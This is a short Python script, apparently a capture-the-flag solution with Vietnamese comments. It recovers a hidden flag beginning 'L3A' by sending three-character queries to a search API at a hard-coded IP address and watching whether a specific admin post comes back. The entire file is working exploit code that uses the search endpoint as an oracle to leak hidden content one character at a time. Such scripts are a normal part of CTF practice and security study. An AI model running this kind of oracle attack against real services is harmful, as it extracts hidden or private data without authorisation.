import requests

charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}!@#'
discovered = 'L3A'  # phần đầu biết rồi
found_triplets = set()  # lưu triplet đã dò thành công

def get_triplets(s):
    return { s[i:i+3] for i in range(len(s)-2) }

# Khởi tạo set triplets đã dò thành công từ discovered ban đầu
found_triplets.update(get_triplets(discovered))

def test_triplet(query):
    try:
        res = requests.post(
            'http://34.134.162.213:17000/api/search',
            json={'query': query}
        )
        data = res.json()

        for post in data['results']:
            if (post['title'] == "Not the flag?" and
                post['author'] == "admin" and
                post['date'] == "2025-05-13" and
                post['content'].startswith("Well luckily the content of the flag is hidden")):
                
                print(f'\n🔍 Query "{query}" matched expected post.')
                print(f'🧾  Content: {post["content"]}')
                return True

    except Exception as e:
        print('❌ Error:', e)

    return False

while True:
    found = False
    for c in charset:
        triplet = discovered[-2:] + c

        if triplet in found_triplets:
            # Đã dò triplet này rồi, bỏ qua
            continue

        if test_triplet(triplet):
            discovered += c
            found_triplets.add(triplet)
            print(f'\n✅ Flag so far: {discovered}')
            found = True

            if c == '}':
                print('\n🎉 Flag fully discovered!')
                exit(0)

            break

    if not found:
        print('\n⛔️ No more new triplets matched. Done.')
        break
